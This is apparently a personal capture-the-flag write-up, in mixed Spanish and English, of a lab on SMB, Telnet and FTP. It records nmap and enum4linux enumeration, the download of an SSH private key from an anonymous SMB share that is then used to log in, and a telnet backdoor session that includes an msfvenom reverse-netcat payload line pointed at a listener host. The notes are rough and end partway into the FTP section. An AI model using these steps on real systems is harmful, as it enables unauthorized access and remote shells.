# WriteUp de Network Service
## SMB

### What does SMB stand for?
Server Message Block
### What type of protocol is SMB? 
response-request
### What protocol suite do clients use to connect to the server?
TCP/IP
### What systems does Samba run on?
Unix

Now we turn on our firt machine and get the IP: 10.64.152.144. Then we proceed doing port scanning:

`nmap -T4 -p- 10.64.152.144`
### Conduct an nmap scan of your choosing, How many ports are open?
3
### What ports is SMB running on? Provide the ports in ascending order.
139/445
### Let's get started with Enum4Linux, conduct a full basic enumeration. For starters, what is the workgroup name?    
WORKGROUP
### What comes up as the name of the machine?    
POLOSMB
### What operating system version is running?    
6.1
### What share sticks out as something we might want to investigate?    
profiles
### What would be the correct syntax to access an SMB share called "secret" as user "suit" on a machine with the IP 10.10.10.2 on the default port? 
smbclient //10.10.10.2/secret -U suit -p 445



nmap -T4 -p- 10.64.152.144

Está demorando mucho
nmap -sS -T4 -p- --min-rate=5000 10.64.152.144 
obtenemos:

PORT      STATE    SERVICE
22/tcp    open     ssh
139/tcp   open     netbios-ssn
445/tcp   open     microsoft-ds

workgroup name: WORKGROUP
name: POLOSMB

	POLOSMB        Wk Sv PrQ Unx NT SNT POLOSMB server (Samba, Ubuntu)                                                   
        platform_id     :       500
        os version      :       6.1
        server type     :       0x809a03
Debemos investigar en la unidad compartida: profiles


SMB Explot: Hay muchas vulnerabilidades como CVE-2017-7494, sin embargo va a ser más común encontrarnos con situaciones en conce la mejor forma de entrar al sistema es mediante malas configuraciones. En este caso explotaremos el acceso a unidades compartidas SMBV anónimas.

De lo anterior ya obtuvimos las enumeraciones

nown Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none

hacemos get a id_rsa y id_rsa.pub
chod 700
cat archivo
en id_rsa no entoncramos nada
en id_rsa.pub encontramos cactus@polosmb
cuanta: cactus
nos loggueamos con la id_rs que encontramos antes
ssh -i id_rsa cactus@10.64.152.144      
ls
cat smb.txt
THM{smb_is_fun_eh?}


Terminamos la máquina, abrimos otra
10.66.153.107
nmap -T5 -p- 10.66.153.107

PORT     STATE SERVICE
8012/tcp open  unknown

telnet 10.66.153.107 8012

Trying 10.66.153.107...
Connected to 10.66.153.107.
Escape character is '^]'.
SKIDY'S BACKDOOR. Type .HELP to view commands
.HELP
.HELP: View commands
 .RUN <command>: Execute commands
.EXIT: Exit
exit
.EXIT
Connection Closed
Connection closed by foreign host.

BACKDOOR


.RUN ping 192.168.198.16 -c 1

192.168.198.16
.RUN msfvenom -p cmd/unix/reverse_netcat lhost=192.168.198.16 lport=4444 R 


ftp es for file transport
10.67.156.191

nmap -T5 -p- 10.67.156.191

